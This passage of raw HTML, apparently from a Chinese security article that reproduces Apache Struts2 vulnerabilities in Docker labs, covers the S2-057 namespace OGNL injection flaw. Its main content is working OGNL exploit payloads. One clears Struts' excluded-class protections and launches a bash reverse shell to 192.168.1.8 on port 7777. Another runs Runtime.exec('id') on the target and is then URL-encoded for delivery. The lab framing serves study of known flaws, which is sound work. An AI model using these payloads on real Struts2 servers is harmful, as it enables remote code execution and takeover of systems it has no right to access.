style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlContext@DEFAULT_MEMBER_ACCESS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">_memberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">):((#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'com.opensymphony.xwork2.ActionContext.container'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">container</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlUtil@class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedPackageNames</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognlUtil</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedClasses</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setMemberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)))).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'bash -i &gt;&amp; /dev/tcp/192.168.1.8/7777 0&gt;&amp;1'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">iswin</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">System@getProperty</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'os.name'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">toLowerCase</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">contains</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'win'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">))).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">iswin</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'cmd.exe'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'/c'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}:{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'/bin/bash'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'-c'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">})).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ProcessBuilder</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cmds</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">redirectErrorStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">true</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">process</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">p</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">start</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils@toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">process</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()))}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5277246653919694" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/57_7a6QRqviafDQyUoxibdNWpXY8CcTvA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wMlaTAXNOkAuSXycwfMET4TSlaE7a6QRqviafDQyUoxibdNWpXY8CcTvA/640?wx_fmt=png'" data-type="png" data-w="1046" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-057</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-057漏洞产生于网站配置XML时如果没有设置namespace的值，并且上层动作配置中并没有设置或使用通配符namespace时，可能会导致远程代码执行漏洞的发生。同样也可能因为url标签没有设置value和action的值，并且上层动作并没有设置或使用通配符namespace，从而导致远程代码执行漏洞的发生。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">alwaysSelectFullNamespace被设置为true，此时namespace的值是从URL中获取的。URL是可控的，所以namespace也是可控的action元素没有名称空间属性集，或者使用通配符。该名称空间将由用户从URL传递并解析为OGNL表达式，最终导致远程代码执行的脆弱性。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-057的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4694229112833764" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/58_L0X1RuoonBQl14aFUvatonrUjVVnKA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w2TE6M0M6fxZ8npY3ibnkwXLdaL0X1RuoonBQl14aFUvatonrUjVVnKA/640?wx_fmt=png'" data-type="png" data-w="1161" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先构造12+34回车</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.23222222222222222" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/59_hxpweZgBsonyeiaEibforC7ib2icXg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wfeT6535l7a3vRzjPnGzkW8vu9BkUhxpweZgBsonyeiaEibforC7ib2icXg/640?wx_fmt=png'" data-type="png" data-w="900" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">发现运算出了结果，说明存在漏洞</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.17813765182186234" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/60_RDJfbZ9wCQOzhTTgLdVwyBzWc7ILaw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w8ZjtaRd7mBYAE6BiaHnXyiauibxRDJfbZ9wCQOzhTTgLdVwyBzWc7ILaw/640?wx_fmt=png'" data-type="png" data-w="741" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">构造payload输出id</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlContext@DEFAULT_MEMBER_ACCESS</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">request</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'struts.valueStack'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">].</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">context</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'com.opensymphony.xwork2.ActionContext.container'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">]).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">cr</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInstance</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@com</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">opensymphony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">xwork2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ognl</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">OgnlUtil@class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedPackageNames</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ou</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getExcludedClasses</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">clear</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">setMemberAccess</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dm</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Runtime@getRuntime</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">().</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">exec</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'id'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)).(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@org</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">apache</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">commons</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">IOUtils@toString</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()))}</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进行url编码</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.19143239625167335" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/61_41PWudO8cVMUIzKwJHmfWeEsibPRvg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wvUWRD1XbX5Uq4vfZd0E7Io7gb41PWudO8cVMUIzKwJHmfWeEsibPRvg/640?wx_fmt=png'" data-type="png" data-w="1494" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">得到如下payload</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" 